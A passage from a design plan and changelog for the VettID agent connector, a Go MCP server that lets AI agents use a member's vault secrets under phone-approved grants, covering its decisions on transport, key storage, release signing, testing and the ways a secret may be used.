    lead's a2 in GC thread #996, replacing the 2026-11-05 rule), only a
    `leash.status.get` answer marks a grant dead (`not_found`) or the
    agent suspended (`forbidden`); an `agent.request` `forbidden` names
    no grant and only asks for a fresh list at once. §7.1 AV1: the
    `Config.PersistBatch` follow-up (vettid-vault #283), which
    vettid-agent #46 uses; A2.2's save-before-ack rule says so. AV7 to
    AV11 carry "Built" notes with their vettid-vault pull requests
    (AV9 to AV11 are not yet in a staging release); A3's status line
    names A3.5 (#43). §4.9: the vault refuses a `~` in a program's last
    element and flags launchers and evaluators (owner decision a, GC
    #14596); and the owner's decision b on GC #14880 for the connector:
    a `.cmd` or `.bat` run is to be allowed with `cmd.exe`
    metacharacters in its arguments refused, fail closed, replacing
    the outright refusal once built (a card after A3.8a). §4.3: an
    `item.get` retransmission can now get a copy without values
    (VAULT-MESSAGING 0.91.1; withheld notes an open owner point);
    `item.run` and
    `item.proxy` answers without `value`, and an `item.get` field
    without `value`, mean "ask again"
  - 0.1.12: erratum, 2026-11-19, with VAULT-MESSAGING 0.91.0 (AV9 and
    AV10 as built, vettid/vettid-vault#270 to #275). §4.9: a connector
    sends a cleaned absolute path for `program` and `cwd`: no trailing
    separator, no `:` in any element, at most 4,096 bytes, no control,
    Cf, Zl or Zp character. No other change
  - 0.1.11: 2026-11-05, the owner's request in the implementing session
    (after the lead's summary, thread 01M6PJT84B0Z9DK24SPAVDDK71): macOS
    signing for the separate-account mode (AGENT-SEPARATE-ACCOUNT,
    vettid.org #539; the owner's Q4 c: macOS runs and proxies wait for
    signed builds). New A5.4: a signed, notarized installer package, with
    every executable signed under the hardened runtime, the run helper
    included, the per-pairing setup by `install`, the uninstaller, and an
    early check of the daemon's keychain. §8 item 3
    gains the Developer ID Installer certificate. "What blocks what"
    gains A5.4. No protocol change
  - 0.1.10: erratum, 2026-11-05, with VAULT-MESSAGING 0.85.3: the
    connector decisions for A3.5 and A3.7 to A3.9. The lead's answers of
    2026-11-05 to the implementing agent's questions (Q2 to Q7: the
    order of grant sets, an old vault, `check_status` for a reveal,
    referred runs and proxies, run details, proxy details). The owner's
    decisions of 2026-11-05: the old-vault notice (option a);
    `--run-path` refuses at startup a directory that the connector's
    user can change (option a), or that sits below a folder that user
    could replace; a bound program's
    content is pinned by its SHA-256 in the item's binding (option b,
    which adds to the first choice, a program that only an administrator
    can change: that check stays for a program with no pin yet); and a program's variables are an
    allowlist in that binding (option a). §4.9 now says how the
    connector runs exactly the file it hashed on each platform (and
    where macOS falls short), and what the pin does not cover. The
    owner's further decisions of 2026-11-05 (thread
    01M6PFQMMSQT0HWGDRGENKZ2Q0): NTFS or ReFS fixed local drives only;
    `#!` scripts refused as bound programs, for now; the extra refused
    names (pager and editor, the askpass pair, `GOFLAGS`,
    `RUSTC_WRAPPER`, proxy and certificate names); the folder-below rule
    for `--run-path`; and the refused names apply to a request's `env`
    and a binding, not to the operator's `--run-env`. The pin is the
    hash with the path it ran from, and a run whose settings changed
    while it waited is decided again. A3.8 is split into A3.8a and A3.8b (§6). New texts in §11
    are marked NEW, for the owner's approval
  - 0.1.9: editorial (status as of 2026-10-26); no rule changes. §6
    status paragraph: nothing has merged in vettid-agent since
    2026-10-20 (#40) and the vault items and the Android work it waits
    for are still not built. §7.1: AV1, AV2, AV4, AV5 and AV6 carry a
    "Built" note with their vettid-vault pull requests
  - 0.1.8: editorial (status as of 2026-10-23): status notes for A0 to A6
    in §6 (A0 to A3 and A5 are built, vettid-agent #7 to #40). The
    header status stays "draft", see the note at the start of §6
  - 0.1.7: §7.2 and §7.4: ANDROID-PLAN 0.1.53 adds the "Devices &
    agents" section (AA1–AA5), approved by the owner (2026-10-20) with
    its recommendations as written, with its own decision table and
    the specification gaps it found (its decision 14). Following its
    decisions 2, 3 and 17: AA2 approves
    a pairing without initial grants (an agent's reading permissions
    are share rules, which `device.pair.approve{grants}` refuses), so
    A6 tests no LEASH grant of an owner type, only agent share rules;
    A6's "auto" step waits for AV9 on staging. The connector's code
    plan is unchanged.
  - 0.1.6: owner decisions of 2026-10-18 on signing. A5.2 and the macOS
    half of A5.3 resume; Windows Authenticode waits until the business
    entity exists. Release tags are signed (the owner's SSH key) and the
    release workflow refuses a tag GitHub cannot verify. A5.2 is one
    command on the owner's Mac (`scripts/sign-release`): check the tag,
    rebuild and compare, build, sign, notarize and staple
    `vettid-agent.app`, sign `SHA256SUMS` (an SSH signature, namespace
    `vettid-agent-release`, which carries its algorithm id), upload and
    publish after confirmation; no key ever reaches CI (AG4). The
    release key and the tag key are on the owner's YubiKey. The Apple
    account is the owner's individual Developer account. The public key
    is published on vettid.org when ready (owner OK, 2026-10-18).
    A5.2, A5.3, "What blocks what", §8 items 2–4.
  - 0.1.5: approved by the owner 2026-10-18, with every reveal asked
    on the phone and `each: false` never covering a shell or an
    interpreter. Owner decision of 2026-10-18: **four ways to use a secret**
    (AG13; VAULT-MESSAGING 0.42.0). Best first: use without seeing
    (today's `leash.execute_action`); run a command with the secret
    (`leash.run_with_secret`); a local proxy that adds an API key
    (`leash.open_proxy`, `leash.close_proxy`); reveal
    (`leash.request_secret`), now off for each item until the member
    turns it on, and sent once, as text only. §4.1, §4.7, new §4.9,
    A3.6–A3.9, AV9–AV11, AA7–AA8, risk 1, §11. The proxy's loopback
    listener is the one exception to AG1a's "no listener". §11 also
    collects, for approval in one pass, the connector texts that
    vettid-agent `main` and its PR #34 use and this plan did not draft.
    (AG10 stays withdrawn; the new decision takes the next free number.)
    Also the owner decisions of 2026-10-18 built in vettid-agent #36:
    a session the member ends in the app starts AG8's quiet period
    (`access_denied`); DPAPI notices for a domain account or a roaming
    profile (AG3, §4.2); the README note on revealed values (A3.6,
    done); `leash.request_secret` carries no `readOnlyHint` (§4.9).
  - 0.1.4: approved by the owner 2026-10-18. Owner decisions of
    2026-10-18. A1.5: macOS uses the data
    protection keychain only (option A), so only the signed app bundle
    (A5) can use it; a bare or unsigned build uses the passphrase
    protector (AG3, §4.2, A1.5, "What blocks what"). A5.2 and A5.3 are
    deferred. AG9 and §4.1: the code `superseded`, and what
    `leash.check_status` answers once a held request's approval window
    has passed. §4.4: only a `vault.status` that is not held ends a
    hold. A3.4: the hold test runs against the real clock, opt-in, with
    no dev clock in the vault. §4.5: agents never get the member's
    credential key, so a delegation's `iss` is checked for consistency
    only. Grant-set sequence numbers (VAULT-MESSAGING 0.41.0; §4.5,
    AV7, A3.5). The device's own access session in `vault.status`
    (VAULT-MESSAGING 0.41.0; §4.3, AV8); the connector's startup probe
    stays until the vault ships it. §4.6 and §8 item 1 no longer call
    the §7.3 questions open (answered in 0.1.2).
  - 0.1.3: owner decisions of 2026-10-17 during A1: the TPM protector
    keeps no key on the TPM, so `forget` cannot make an old copy of the
    state file recovered from the disk unopenable on the same computer
    (accepted; §4.2); a Windows passphrase file, or a regular file given
    by descriptor, must pass the same owner-only check as the state file.
  - 0.1.2: the owner's answers of 2026-10-17 to §7.3: Q1 recorded as a
    known difference in LEASH-IMPLEMENTATION; Q2 waits; Q3, Q4 and Q5
    in VAULT-MESSAGING 0.40.0 (a bound on access-session prompts, then
    AV6; re-pairing after a long absence; grants fetched when a session
    starts). AV6 is now planned vault work.
  - 0.1.1: owner decisions of 2026-10-17: AG0 agreed (agent first);
    AG1a decided as the simplest and most secure form: stdio only, one
    process started by the MCP client, no daemon, no local socket, no
    network listener and no service files; one pairing per MCP client;
    AG10 withdrawn; AG2–AG9, AG11 and AG12 accepted as recommended.
  - 0.1.0: first draft, for the owner's approval before any code is
    written. The plan for rebuilding the VettID agent connector in
    `vettid/vettid-agent` (Go) on the current architecture: a paired
    device of role `agent` (VAULT-MESSAGING §6.7), acting within access
    sessions and approvals (§6.8) under LEASH grants (§10.11). Starting
    point (what of the 2026-05 connector is worth keeping, and how the
    old code is retired); decisions with recommendations (§2); the
    package layout and its use of vettid-vault's reference client (§3);
    connector-specific matters: the agent-facing interface, keys at
    rest per platform, the process model, sessions and approvals, offline and
    locked vaults (§4); test vectors (§5); phases A0–A6 as small PRs
    with acceptance tests (§6); the work outside the repository in
    vettid-vault, vettid-android and vettid.org (§7); owner
    prerequisites (§8); coordination rules (§9); risks (§10); draft
    texts (§11). The agent-facing interface is an MCP server (owner
    decision of 2026-10-17, AG1); its transports are recommended in
    AG1a. Nothing in this plan changes a protocol
owner: Al Liebl (Mesmer)
related:
  - AGENT-SEPARATE-ACCOUNT.md (0.1.4) — the connector in its own account
    (AG14, A3.10, A5.5, A5.6; the macOS side is A5.4)
  - AGENT-LINUX-RUNTIME.md (0.1.1, draft) — the separate-account mode on
    Linux: units, the key as a systemd credential, the run helper (A5.6)
  - VAULT-MESSAGING.md (0.42.0) — §6.7, §6.8, §7, §8, §9.1, §10.2,
    §10.3, §10.11, §10.12; the connector's contract with the vault
  - LEASH-IMPLEMENTATION.md — "Connector"; the LEASH paper
    (`vettid/LEASH`), §3.3 MCP binding and §3.4
  - RELAY-PROTOCOL.md (0.9.4), RELAY-PLAN.md ("vettid-agent")
  - ARCHITECTURE.md (0.1.4), TECH-PREVIEW.md
  - STAGING-DEVELOPMENT-PLAN.md (0.1.2, §5 row 3)
  - ANDROID-PLAN.md (0.1.53) — "Devices & agents" (§4, approved), the
    `agents` History category, agent share-rule limits
  - PQC-MIGRATION.md (§4 row 5, release signing root)
  - IOS-PLAN.md (0.1.1) — the model for this plan's form
classification: public (no secrets; safe for github.com/vettid)
---

# Agent connector plan (v1)

The VettID agent connector, rebuilt in the existing `vettid/vettid-agent`
repository against the current vault: a small Go program that runs next
to an AI agent, pairs with the member's vault as a device of role
`agent`, and gives the agent a narrow, audited way to use what the
member has delegated to it. Nothing in this plan changes a protocol:
where the connector needs one, §7.3 says so and the change goes through
the owner as a vettid.org specification change.

**Who reads this.** The owner, to approve or change the decisions of §2;
then a Claude Code instance (the "implementing agent") that builds it.
Everything it needs is in this document, in the public repositories
(`vettid/vettid-agent`, `vettid/vettid-vault`, `vettid/vettid-relay`,
`vettid/vettid-android`, `vettid/vettid.org`, `vettid/LEASH`) and in the
specifications under `docs/` here. Paths below are relative to those
repositories. Commits read for this version: vettid.org `ccb7b20`,
vettid-vault `1ef2dd9` (2026-10-17), vettid-android `b54685f`
(2026-10-17), vettid-agent `11b5956` (2026-05-26), LEASH `85075df`
(2026-10-12); for 0.1.4, vettid-agent `0016eea` and its PR #34
(2026-10-18); for 0.1.5, vettid-agent `5cd72fe` (#36, 2026-10-18).

**Words.** The *agent* is the AI program (an MCP client such as an IDE
assistant or an agent framework). The *connector* is this program; in
the vault it is the device of role `agent`, and VAULT-MESSAGING calls it
"the agent" too. The *operator* is whoever installs and runs the
connector on a computer; usually the member.

## 1. Starting point

- **The existing connector** (`vettid-agent` `main`, last changed
  2026-05-26): about 11,900 lines of Go under `cmd/vettid-agent` and
  `internal/`. It implements the **old architecture**: NATS messaging
  to vettid.dev (`internal/nats`), the old enrollment by a 12-character
  invite code (`internal/registration`), its own X25519/ChaCha20
  constructions (`internal/crypto`), an encrypted `connection.enc`
  sealed with Argon2id over a passphrase and a *platform key* derived
  from machine attributes (`internal/credential`,
  `internal/fingerprint`), a local REST and WebSocket API
  (`internal/api`), and LEASH JWT helpers against vettid.dev's demo
  endpoints (`internal/leash`, `cmd/vettid-agent/leash.go`, `demo.go`).
  None of its protocol code talks to the current vault (LEASH-IMPLEMENTATION
  "Connector"; STAGING-DEVELOPMENT-PLAN §5 row 3). **Treat all of it as
  replaced.**
- **Worth keeping as ideas** (each rewritten against the current spec,
  with its tests):
  - *No secret caching*: item values pass through to the agent and are
    never written to disk or logs (old `CLAUDE.md` "Key Design
    Decisions"). Kept as a rule (§4.7).
  - *One connector, one vault*; several vaults or several agents on one
    computer are several state directories (`--state-dir`). Kept.
  - *A local rate limit in front of the vault* (old
    `internal/api/rate_limit.go`): a token bucket that fails fast before
    a request costs a vault round trip. Kept for the MCP tools (§4.1).
  - *Owner-only files on Windows* (draft PR #4, `internal/ownerfile`): a
    protected DACL with one entry for the current user, written beside
    the target and renamed over it, and checked on load. The design is
    reused in A1.1; the code is rewritten there.
  - *Passphrase strength rules* (old `internal/credential/passphrase.go`:
    at least 12 characters and 3 of 4 classes), for the passphrase
    protector only (§4.2).
  - The CI points of issue #3: actions pinned by commit SHA,
    `go-version-file: go.mod`, a gitleaks job, a Windows job, and
    `govulncheck` (old `Makefile` target `vuln`).
- **Dropped**: `internal/nats`, `internal/registration`,
  `internal/crypto` (the vault's own packages replace it, §3),
  `internal/credential` and its file format, `internal/fingerprint`
  (the machine-attribute platform key, §2 AG3), `internal/api` (REST and
  WebSocket; the interface is an MCP server, owner decision of
  2026-10-17, §2 AG1), `internal/leash` and the `leash`/`demo`
  subcommands (vettid.dev JWTs; the current format is VAULT-MESSAGING
  0.12.0's delegation and status statement), the `extend` and `rebind`
  subcommands, and the dependencies `nats.go`, `gorilla/websocket`,
  `zerolog`, `BurntSushi/toml` and `cobra` (the standard library's
  `flag` and `log/slog` suffice, as in vettid-vault's `vaultctl`).
- **Open issues and draft PRs on vettid-agent** (all opened 2026-10-13,
  Windows): #1 file-mode checks fail on Windows; #2 the machine
  fingerprint collects only the hostname on Windows; #3 a Windows CI job;
  #5 Smart App Control blocks unsigned test binaries; draft PRs #4
  (owner-only files via a DACL) and #6 (Windows machine attributes).
  Disposition, done in A0.1 by the implementing agent with a short
  comment pointing at this plan: **#1** closed by the rewrite (the new
  state store has Windows owner-only files from A1.1, with a test that
  runs on the Windows job); **#2** closed as not planned (the
  machine-attribute key is dropped, AG3); **#3** adopted in A0.1;
  **#5** kept open as the input to AG4 (Windows signing) and closed
  when signed builds run under Smart App Control (A5.3); **PR #4**
  closed, its design carried into A1.1; **PR #6** closed (AG3).
- **When the old code goes**: PR **A0.1** tags the old `main` as
  `legacy-v1-final`, pushes a branch `legacy/v1`, and removes the old
  code from `main` (as vettid-android did, ANDROID-PLAN D1, and as
  IOS-PLAN I0.1 does). The old GitHub releases are edited to say they
  are for the retired vettid.dev service. Nothing before A0.1 deletes
  anything.
- **The vault side is built.** Agent pairing with initial grants and a
  first access session (`vault/core.go` `hPairApprove`,
  `vault/handshakes.go`), access sessions and held approvals
  (`vault/access.go`: 60 s–24 h, 10-minute requests, 5-minute approvals,
  8 held per device), the agent role gate and the LEASH hook
  (`vault/inbound.go`), and LEASH itself (`features/leash/leash.go`:
  grants, delegations, status statements with rotation chains,
  cooldowns, the 20-referral cap, suspension after 30 refusals,
  summaries, `agent.request`) are in vettid-vault `main` and in staging
  images (staging's `enclave/releasecfg/staging.json` lists `leash`;
  production's `prod.json` lists no optional feature, so **no
  production vault answers agent pairing today**, VAULT-MESSAGING
  §11.10.8). `e2e/leash_test.go` and `e2e/leash_status_test.go` pair an
  agent through a real relay and exercise it with the reference client.
  A read of those files against §6.7, §6.8 and §10.11 for this plan
  found no difference in the enclave; the gaps are in the reference
  client and the dev stack (§7.1) and in what the spec leaves open
  (§7.3).
- **The reference client is the best evidence of what a connector
  does.** vettid-vault `client/` (package `client`, "the reference client
  for a vault's owner devices: an app, desktop or agent") pairs from a
  link, runs the handshake and shows the SAS, keeps the session through
  vault-initiated rekeys, refreshes tokens, follows identity rotation,
  and has the agent side of LEASH (`client/leash.go`: `AgentRequest`,
  `LeashGrants`, `LeashStatus`, `LeashPresent` with the quarter-lifetime
  refresh, `VerifyDelegation`). `cmd/vaultctl` drives it from the
  command line (`vaultctl pair -link`, `vaultctl agent request|grants|present`).
- **The Android app has no pairing or LEASH screens.** It parses agent
  QR kinds (`core/crypto/…/invite/Invite.kt`) and lists
  `device.session.pending` and `approval.pending` in Approvals, but can
  only decline them ("This version of the app does not pair desktops or
  agents, so it can only decline.", `feature/approvals` strings); the
  feed has `leash.*` texts and the History category `agents`
  (ANDROID-PLAN §4), and the share-rule model knows an agent subject
  (`core/data/…/items/Sharing.kt` `ShareSubject`). ANDROID-PLAN lists
  "Devices & agents" as later. Without the Android work of §7.2 no
  member can pair a connector with a staging vault; everything before
  that runs on the dev stack.

## 2. Decisions

All decided or accepted by the owner on 2026-10-17; recorded so that
the implementing agent does not reopen them.

| # | Decision | Recommendation | Alternatives | Needed by |
|---|---|---|---|---|
| AG0 | **Agent before desktop** | **Decided (owner, 2026-10-17): agent first.** It has no UI of its own, LEASH is the published differentiator, and the Android screens it needs (pairing, SAS, devices list, approvals) are the ones a desktop needs too, so the desktop then reuses them | — | — |
| AG1 | **Agent-facing interface** | **Decided (owner, 2026-10-17): an MCP server.** The local REST and WebSocket API of the old connector is dropped as the agent interface. This matches the LEASH paper's first binding (§3.3: "In the MCP binding it is an MCP server") and VAULT-MESSAGING §10.11's mapping (`leash.request_secret` → `agent.request{op: "item.get"}`, etc.); the tool set is in §4.1 | — | — |
| AG1a | **MCP transport and process model** | **Decided (owner, 2026-10-17): stdio only, one process.** The MCP client starts `vettid-agent mcp` itself and talks to it over its standard input and output; the process holds the state file's lock, talks to the vault directly, and exits when the client closes it. No daemon, no local socket or named pipe, no network listener, no service files: nothing on the computer but the client that started it can reach the tools. **One pairing per MCP client**: each client gets its own state directory (`--state-dir`), so the phone lists each separately with its own grants and can remove one without the others; a second process on the same state exits with "in use by another agent app". The connector reaches the vault only while a client runs it; it catches up on start (§4.6). (2026-10-18) One exception, with AG13: the loopback proxy of §4.9, only while an approved proxy lasts. **(0.1.16) The exception for the separate-account mode (AG14; AGENT-SEPARATE-ACCOUNT §4, §5):** the stub (`vettid-agent mcp --name <n>`), the connector service and their local channel (a named pipe on Windows, a Unix socket on Linux and macOS, reachable only by the member's account and the service; (0.1.16, the lead's call) an elevated administrator or root is also admitted, only for `pair`, `forget` and `status`, never for tools), and the vault reached while no client runs: the service is started on demand (Q5 b); after the last stub leaves it still reaches the vault while a run is in flight or a run's answer is kept (§4.9), and stops after its idle time. What is said above holds for the same-account connector, which stays for `use`, the catalog and reveal (Q2 a) | Rejected: a shared daemon behind an owner-only socket (more to build, install and protect; every process of the operator's user can reach the socket); Streamable HTTP on `127.0.0.1` (a listener, DNS rebinding exposure, a token file to protect); a plain CLI for agents to shell out to (needs shell access, no tool schema) | — |
| AG2 | **Language and reuse** | **Accepted (owner, 2026-10-17).** **Go, importing vettid-vault's packages**: `github.com/vettid/vettid-vault/client` for pairing, the session, tokens and LEASH, and `vms/leashwire` for verification, pinned to a vettid-vault commit. Established for this plan (§3.2): the module is public, AGPL-3.0 like vettid-agent, the packages are outside `internal/` (their own `internal/` imports are allowed transitively), the import graph has no AWS SDK, and a stripped binary importing `client` builds to about 5 MB. What the client lacks for a long-running connector is added **in vettid-vault's `client` package** by small PRs (§7.1 AV1–AV5), not forked | (a) Import only the `vms/*` wire packages and write the session runtime in vettid-agent (about 1,000 lines of protocol code that would drift from the reference); (b) reimplement everything from the spec and the §16 vectors (largest; a second protocol implementation to keep equal); (c) Rust (no shared code with the vault) | A0.2 |
| AG3 | **Keys and pairing state at rest** (a security path, §9 rule 6) | **Accepted (owner, 2026-10-17).** The device's secrets (its `ik`, `kem` and relay-key seeds, the vault record and session keyring: the client's `Save()` output) in **one state file**, XChaCha20-Poly1305 under a random 256-bit data key, the data key wrapped by a **platform protector**: **Linux**: TPM 2.0 (`/dev/tpmrm0`, a sealed object bound to the TPM) when present, else the passphrase protector; **macOS**: an item in the data protection keychain, `kSecAttrAccessibleWhenUnlockedThisDeviceOnly`, not synchronizable, usable only by the signed app bundle (owner decision of 2026-10-18, option A; §4.2); a bare or unsigned build uses the passphrase protector; **Windows**: DPAPI (user scope) plus the owner-only DACL of A1.1 (2026-10-18: a domain account or a roaming profile gets a notice, not a refusal, §4.2); **headless or containers**: the passphrase protector (Argon2id), from a prompt, a file descriptor or a credential file, with a warning that it is not machine-bound. The **machine-attribute platform key is dropped** (§4.2). **(0.1.16) In the separate-account mode (AG14)** the keys are under the connector's account, per platform: Windows, DPAPI of the virtual service account; Linux, `LoadCredentialEncrypted=` sealed to the TPM 2.0, never a passphrase typed at start, the data key generated by the elevated `pair` and sealed as the systemd credential (a key-handling change, §9 rule 6, with its own independent review before code; without a TPM 2.0, owner c on GC #15786: only with `--no-tpm` named at install, then systemd's host key (root-readable, not hardware-bound), said in `install`'s output and in `status`); macOS, the System keychain with an access list naming the connector's code-signing requirement (A5.4), subject to A5.4's keychain check; AGENT-SEPARATE-ACCOUNT §3 "Keys at rest", §4.2 here | (a) Keep the fingerprint key (hostname, machine id, CPU, disk serial, MAC; 3 of 5): readable by any local process, partly visible on the network, breaks on hardware changes, and failed on Windows (#2); (b) OS secret services only (GNOME Keyring/KWallet): absent on servers; (c) plain 0600 file (what `vaultctl` does; fine for tests only) | A1 |
| AG4 | **Platforms, distribution and signing** | **Accepted (owner, 2026-10-17).** **Linux amd64/arm64 first, then macOS arm64 and Windows amd64** (A5). Static, `CGO_ENABLED=0` builds where possible (macOS needs cgo for the Keychain and is built on a macOS runner or the owner's Mac), **reproducible** (`-trimpath`, fixed toolchain from `go.mod`, `SOURCE_DATE_EPOCH`, build ids stripped), with a script that rebuilds a release and compares hashes. **The owner signs**: a release signing key held offline by the owner signs `SHA256SUMS` (Ed25519 now; PQC-MIGRATION §4 row 5 names SLH-DSA-128s for this root in phase 2, so the signature format carries an algorithm id); macOS binaries with the owner's Apple Developer ID and notarized, as the app bundle `vettid-agent.app` (its Keychain entitlement needs the bundle, §4.2); Windows binaries with an Authenticode certificate whose key is on a hardware token the owner holds. **No third party holds a VettID signing key**: no cloud signing service that keeps the key (for example a CA-hosted or cloud-HSM signing service), no keyless signing that rests on a third party's identity. No auto-update in v1. **(0.1.16) The separate-account mode (AG14) is built in this order:** Windows (A3.10a to A3.10c, A5.5), then Linux (A5.6); macOS runs and proxies wait for A5.4 and signed builds (Q4 c) | Linux only for v1 (most agents run on Linux or macOS; Windows users wait); unsigned Windows builds (Smart App Control may block them outright, #5); Sigstore keyless (trust in a third party's CA and log) | A5 |
| AG5 | **v1 scope** | **Accepted (owner, 2026-10-17).** **Pairing** (pasted code, SAS, approval or rejection, unlink); **access sessions** (request, granted, ended, expiry); **grants** (list, updates, suspension, status statements kept fresh); **items through LEASH**: `catalog`, `item.get`, `item.use` (`hmac-sha256`), with referred requests and `leash.check_status`; **connection info**. **v1.1**: the delegable owner types as MCP tools (`connection.list`, `.get`, `message.send`, `.list`, `.get`, `.read`, `profile.get`, `action.list`, `.invoke`; §10.11 scope table). **Later**: presenting delegations to other tool servers with a proof of possession (waits for the LEASH MCP profile, §7.3 Q2), the vault's HTTP action (needs enclave egress, §10.11, §15 item 7), binary attestation (Q1) | All delegable types in v1 (messaging on the member's behalf is the most sensitive delegation and deserves its own review of texts and defaults) | A3 |
| AG6 | **Vault changes** | **Accepted (owner, 2026-10-17).** **Small enclave changes for v1**: the bound on access-session prompts (AV6, VAULT-MESSAGING 0.40.0, §7.3 Q3); (2026-10-18) grant-set sequence numbers (AV7, VAULT-MESSAGING 0.41.0) and the device's own session in `vault.status` (AV8); in a staging release. Otherwise small changes in vettid-vault's **reference client** (`client/`) and **dev stack** docs (§7.1), which need no vault release | Forking the client into vettid-agent | A2 |
| AG7 | **Testing** | **Accepted (owner, 2026-10-17).** Three layers: **unit** tests with fakes (MCP, the session runtime, state store, protectors, no network); **dev-stack integration** tests behind a build tag, against vettid-vault's `cmd/devstack` with `vaultctl` playing the member's app (§4.8); **staging** tests with **staging test accounts only**, the Android staging app on a test phone, and a written checklist (A6). Never real member data, never a production vault | Integration tests only through the vault's in-process e2e helpers (they are under `internal/`, not importable); staging only (slow, needs the Android work first) | A2 |
| AG8 | **When the connector asks for an access session** | **Accepted (owner, 2026-10-17).** **On the first tool call that needs one**, the connector sends `device.session.request{seconds}` (the operator's configured default, 1 h if unset) and answers the tool "Access requested on your phone". At most one request outstanding; after a denial or a request that expired unanswered, no new automatic request for 10 minutes; (owner decision, 2026-10-18) likewise after a session the member ended in the app (`device.session.ended{reason: "ended"}`), which also clears an outstanding request, while a session that simply expires starts no quiet period; during a quiet period after an ended session a tool call is answered `access_denied` with the text of §11 ("Access ended"); at most 6 automatic requests an hour. The vault answers a request within 10 minutes of the last accepted one `too_soon` (VAULT-MESSAGING 0.40.0, AV6); the connector keeps its own bound as well and waits for `allowed_after` | Only on the operator's explicit command (safer for the member's attention, but an agent then fails until a human runs a command) | A2.3 |
| AG9 | **Long approvals and MCP timeouts** | **Accepted (owner, 2026-10-17).** A tool call waits up to 20 s for its response. A request the vault holds (`approval.waiting`, up to 5 minutes) or that is still in flight returns `{status: "pending", request_id}`; `leash.check_status{request_id}` returns `pending`, the result, `denied`, `approval_timeout`, `expired` or `superseded`. (Owner decision, 2026-10-18.) Once a held request's approval window (`exp`) has passed, `leash.check_status` still answers `pending`, with `waiting_for_approval` false and the text "Approval window passed" of §11; the vault's own answer is still collected and returned, normally `approval_timeout`. A request ends with `superseded` when the vault connection reports that another copy under the same request id took its place; it is not sent again. The process keeps waiting for the response in the background while it runs and keeps results for 10 minutes (memory only; a secret's value is dropped once returned) | Blocking the tool call for up to 5 minutes (many MCP clients time out tool calls well before that) | A3.2 |
| AG10 | **Daemon lifetime and service files** | **Withdrawn (owner, 2026-10-17)** with AG1a: there is no daemon and no service file. **(0.1.16) Stays withdrawn.** The separate-account mode is a different decision, AG14, which has a service per pairing; it does not reopen AG10 | — | — |
| AG14 | **The separate-account mode** | **Decided (owner, 2026-11-05, option c; build directed 2026-11-21, GC #15754).** The connector runs in an account of its own, as **a service per pairing** (`NT SERVICE\vettid-agent-<n>` on Windows, a system user on Linux, a hidden user on macOS), with **two runner accounts** (one per run slot) that run a run's program and can read none of the connector's state, profile or process, and **a stub in the agent's account** (`vettid-agent mcp --name <n>`: no keys, no state, no values) that passes MCP messages over a checked local channel. **Runs and proxies ship only in this mode** (`leash.run_with_secret` and `leash.open_proxy` answer `separate_account_required` otherwise; macOS: after signed builds, Q4 c, A5.4). **The same-account connector stays for `use`, the catalog and reveal** (Q2 a). The owner's answers of 2026-11-05 (AGENT-SEPARATE-ACCOUNT §9): 1 a folders per item through an administrator-only `share`; 2 a; 3 a three accounts and a service per pairing; 4 c; 5 b on demand; 6 a two slots, one reused only once every process of the last run is gone; 7 a `pair`, `forget` and `share` need an administrator; 8 a hardened profiles and pinned control files; 9 a files handed in and out. The vault cannot tell which mode a pairing runs in (AG11 is self-asserted), so "only in this mode" is the connector's own policy (note §2). Built by A3.10a to A3.10c and A5.5 (Windows), then A5.6 (Linux); A3.8b and A3.9 start after A5.5, and A5.6 gates Linux runs only (§6). (0.1.17) Q1, Q8 and Q9 are now carded: `folders` and `cwd_not_allowed`, and Q9's `inputs` and `output`, are in VAULT-MESSAGING 0.93.0 (card #15810; not built); the vault card is #15811 (AV12), the apps' #15812 (Android, AA9) and #15813 (iOS), `share` on Windows #15814 (A5.5a), hardened profiles and pinned control files (Q8) #15815 (A3.10e), files handed in and out #15816 (A3.10d), and the macOS runtime pieces (the run helper's macOS variant, a launchd job per run, killing every process of the runner uid, `getpeereid`, the Unix socket end, and a `--run-path` check that also reads macOS ACLs (`chmod +a`), not only the mode bits) #15817. `share` on Linux is not carded. Until these ship, runs use `work/` only. This is a separate decision from AG10, which stays withdrawn | Rejected (note §9): one service and runner per member user (the pairings would share them); the service only, no same-account connector; always running; one runner per run or per pairing; no elevation for `pair`, `forget` and `share` | A3.10 |
| AG11 | **What the connector reports about itself** | **Accepted (owner, 2026-10-17).** Its self-asserted name only (the operator chooses it; default "Agent on <host name>", editable before pairing). No machine attributes and no binary hash are sent: the vault does not accept them (§10.11 "out of the vault's scope") | Sending a binary hash in the `hs.init` profile (the vault would ignore or refuse unknown members) | A2.1 |
| AG12 | **Unlinked or refused** | **Accepted (owner, 2026-10-17).** On `device.unlinked`, the connector stops, deletes its state file (and the protector's key), and says so. On `token_revoked` for its own vault's mailbox without `device.unlinked`, it stops and tells the operator, and deletes only on the operator's `vettid-agent forget` (as an app offers an erase rather than erasing, §6.7.1, §8.6). A behavior-changing fix here takes the independent review of §9 rule 6. (0.1.16) In the separate-account mode the service cannot delete its own sealed credential or keychain item: see §4.2 "Wipe in the separate-account mode" | Erase on any refusal (a relay mistake would destroy a working pairing) | A2.2 |
| AG13 | **Four ways to use a secret** | **Decided (owner, 2026-10-18): all four, best first**; the agent uses the best way an item allows for its task (§4.9; VAULT-MESSAGING 0.42.0 §10.11 "Ways to use a secret"). **1. Use without seeing**: the vault does the action and returns only the result (`leash.execute_action`, `item.use`). **2. Run a command with the secret** (`leash.run_with_secret`): the phone approval shows the exact argv, the working directory and how the secret is passed; the connector starts that one process with the secret only in its environment, its standard input or an owner-only temporary file, with a minimal environment, and returns the exit code and output with the value redacted. **3. Local proxy for API keys** (`leash.open_proxy`): a loopback HTTP proxy, reached as a base URL, adds the key to requests for the item's bound host only, over verified TLS, for a bounded time per approval; the agent never sees the key. **4. Reveal** (`leash.request_secret`): only for items the member marked "may be shown to agents" (off by default, existing items included), sent once as text. Per agent and item, the member allows a **set** of ways (`use` always; `run`, `proxy` and `reveal` each on its own), not an order: run and proxy fit different secrets, and allowing a proxy for an API key must not let any command receive it | Ordered modes (each allows the ones below: simpler to show, but "proxy" would then allow "run" or the reverse); keep reveal as the only way (the value stays in the agent app's history); a proxy that terminates TLS with a local CA (§4.9) | A3.6 |

## 3. Architecture

### 3.1 Package layout

One Go module, `github.com/vettid/vettid-agent`, Go at vettid-vault's
`go.mod` version or later, one binary `vettid-agent`.

| Package | Contents |
|---|---|
| `cmd/vettid-agent` | Subcommands: `pair`, `mcp`, `status`, `forget`, `version`; flags only, no logic |
| `internal/state` | The state file (§4.2): format, atomic write, owner-only files (POSIX modes; Windows DACL), an exclusive lock per state directory, wipe |
